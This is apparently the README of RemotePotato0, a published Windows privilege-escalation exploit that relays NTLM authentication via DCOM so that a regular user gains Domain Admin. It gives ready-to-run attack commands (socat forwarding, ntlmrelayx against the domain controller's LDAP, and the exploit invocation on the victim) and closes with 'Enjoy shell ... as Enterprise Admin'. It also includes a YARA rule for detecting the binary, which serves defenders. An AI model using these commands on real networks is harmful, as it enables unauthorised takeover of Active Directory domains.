# RemotePotato0
Just another "Won't Fix" Windows Privilege Escalation from User to Domain Admin.

RemotePotato0 is an exploit that allows you to escalate your privileges from a generic User to Domain Admin. 

Briefly:

It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine.
It is required you have a shell in session 0 (e.g. WinRm shell or SSH shell) and that a privileged user is logged on in the session 1 (e.g. a Domain Admin user).
Once the NTLM type1 is triggered we setup a cross protocol relay server that receive the privileged type1 message and relay it to a third resource by unpacking the RPC protocol and packing the authentication over HTTP. On the receiving end you can setup a further relay node (eg. ntlmrelayx) or relay directly to a privileged resource.

Full details at --> https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop

## Example

Attacker machine (10.0.0.20):

```
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.11:1111 &
sudo ntlmrelayx.py -t ldap://10.0.0.10 --escalate-user winrm_user --no-wcf-server
```

Victim machine (10.0.0.11):

```
.\RemotePotato0.exe -r 10.0.0.20 -p 1111
```

Victim Domain Controller (10.0.0.10)

Enjoy shell (eg. psexec) as Enterprise Admin to the domain controller ;)

## Demo

<img src="demo.gif">

## Detection

Yara rule to detect RemotePotato0 binary:

```
rule SentinelOne_RemotePotato0_privesc {
    meta:
        author = "SentinelOne"
        description = "Detects RemotePotato0 binary"
        reference = "https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop"
        
    strings:
        $import1 = "CoGetInstanceFromIStorage"
        $istorage_clsid = "{00000306-0000-0000-c000-000000000046}" nocase wide ascii
        $meow_header = { 4d 45 4f 57 }
        $clsid1 = "{11111111-2222-3333-4444-555555555555}" nocase wide ascii
        $clsid2 = "{5167B42F-C111-47A1-ACC4-8EABE61B0B54}" nocase wide ascii
        
    condition:        
        (uint16(0) == 0x5A4D) and $import1 and $istorage_clsid and $meow_header and 1 of ($clsid*)
}
```

## Authors

* [Antonio Cocomazzi](https://twitter.com/splinter_code)
* [Andrea Pierini](https://twitter.com/decoder_it)

## Credits

* [Impacket](https://github.com/SecureAuthCorp/impacket)
